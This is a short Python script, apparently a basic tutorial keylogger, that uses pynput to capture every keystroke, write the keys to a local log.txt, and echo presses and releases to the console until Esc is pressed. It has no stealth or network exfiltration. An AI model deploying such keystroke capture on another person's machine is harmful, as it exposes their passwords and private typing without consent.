#python3
import time
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print("Alplhanumeric key {0} pressed\n".format(key.char))
    except AttributeError:
        print("Special key {0} pressed\n".format(key))

def write_file(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            f.write(k)
            f.write("\n")

def on_release(key):
    try:
        print("\n\nAlplhanumeric key {0} released\n".format(key.char))
    except AttributeError:
        print("\n\nSpecial key {0} released\n".format(key))

    if key == Key.esc:
        return False
    
    time.sleep(0.5)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
